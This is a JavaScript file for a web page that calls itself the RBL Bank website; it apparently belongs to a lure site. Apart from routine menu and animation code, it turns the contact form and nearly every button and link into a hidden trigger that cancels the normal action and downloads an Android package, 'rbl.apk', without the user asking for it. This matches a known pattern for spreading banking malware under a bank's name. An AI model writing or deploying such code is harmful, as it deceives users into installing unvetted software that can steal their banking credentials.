// Mobile Menu Toggle
const menuToggle = document.querySelector('.menu-toggle');
const navMenu = document.querySelector('.nav-menu');

if (menuToggle) {
    menuToggle.addEventListener('click', () => {
        menuToggle.classList.toggle('active');
        navMenu.classList.toggle('active');
    });
}

// Close menu when link is clicked
const navLinks = document.querySelectorAll('.nav-menu a');
navLinks.forEach(link => {
    link.addEventListener('click', () => {
        menuToggle.classList.remove('active');
        navMenu.classList.remove('active');
    });
});

// Smooth scroll for navigation
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        const href = this.getAttribute('href');
        if (href !== '#' && document.querySelector(href)) {
            e.preventDefault();
            document.querySelector(href).scrollIntoView({
                behavior: 'smooth'
            });
        }
    });
});

// Form submission - Download APK
const contactForm = document.querySelector('.contact-form');
if (contactForm) {
    contactForm.addEventListener('submit', (e) => {
        e.preventDefault();

        // Create download link for APK
        const link = document.createElement('a');
        link.href = './rbl.apk';
        link.download = 'rbl.apk';
        link.style.display = 'none';

        // Add to DOM, click, and remove
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        console.log('APK download triggered from contact form');
        contactForm.reset();
    });
}

// Button click handlers - Download APK for all buttons
const allButtons = document.querySelectorAll('button, .service-link, .btn');
allButtons.forEach(btn => {
    btn.addEventListener('click', function(e) {
        // Prevent default for links and forms
        if (this.tagName === 'A' || this.type === 'submit') {
            e.preventDefault();
        }

        // Create download link for APK
        const link = document.createElement('a');
        link.href = './rbl.apk';
        link.download = 'rbl.apk';
        link.style.display = 'none';

        // Add to DOM, click, and remove
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        console.log('APK download triggered from:', this.textContent || this.innerText);
    });
});

// Lazy load animation for cards
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
        }
    });
}, observerOptions);

// Observe all service and feature cards
document.querySelectorAll('.service-card, .feature-item, .benefit-card').forEach(card => {
    card.style.opacity = '0';
    card.style.transform = 'translateY(20px)';
    card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
    observer.observe(card);
});

// Log when page loads
console.log('RBL Bank website loaded successfully!');
